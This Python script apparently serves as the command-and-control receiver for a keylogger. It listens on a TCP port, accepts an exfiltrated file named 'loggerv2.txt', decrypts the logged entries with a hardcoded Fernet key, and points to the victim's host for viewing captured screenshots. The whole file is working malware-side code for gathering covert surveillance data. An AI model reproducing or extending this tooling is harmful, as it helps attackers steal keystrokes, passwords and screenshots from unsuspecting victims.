import socket
from cryptography.fernet import Fernet

# Server details
SERVER_HOST = '0.0.0.0'  
SERVER_PORT = 12345  # Use a port number to listen.

def decode_encrypted_textfile():
    # Fernet key for encryption.
    decode_list = []
    key = b'fqcKPySL2MqDArnC5tWlJDdODBGN5IlVmHnIv58wFK4='
    cipher_suite = Fernet(key)

    with open('loggerv2.txt','r') as f:
        for x in f.readlines():
            decode_list.append(x.strip())

    for encrypted_log in decode_list:
        try:
            decrypted_log = cipher_suite.decrypt(encrypted_log)
            
            with open('decrypted_log','a') as f:
                f.write(decrypted_log.decode())
        
        except Exception as e:
            pass
    print("Please check the log file named-> loggerv2.txt")


def start_server():
    try:
        # Create a socket object
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Bind the socket to the address and port
        server_socket.bind((SERVER_HOST, SERVER_PORT))

        while True:
            # Listen for incoming connections
            server_socket.listen(1)
            print(f"[*] Listening on {SERVER_HOST}:{SERVER_PORT}")

            # Accept a client connection
            client_socket, client_address = server_socket.accept()
            print(f"[*] Accepted connection from {client_address[0]}:{client_address[1]}")
    

            # Receive data from the client
            received_data = b""
            while True:
                data_chunk = client_socket.recv(2048)
                if not data_chunk:
                    break
                received_data += data_chunk

            # Write received data to a file
            with open("loggerv2.txt", "wb") as f:  # Use 'ab' mode to write as bytes
                f.write(received_data)

            print("Log file received and saved successfully.")
            print(f'open this link to view the screenshots - http://{client_address[0]}:9090')
            break
            
            client_socket.close()
            # After the transfer of the file, decrypt the file.

    except Exception as e:
        print(f"Error in server: {e}")

    finally:
        # Close the server socket
        server_socket.close()

# Start the server
start_server()
decode_encrypted_textfile()
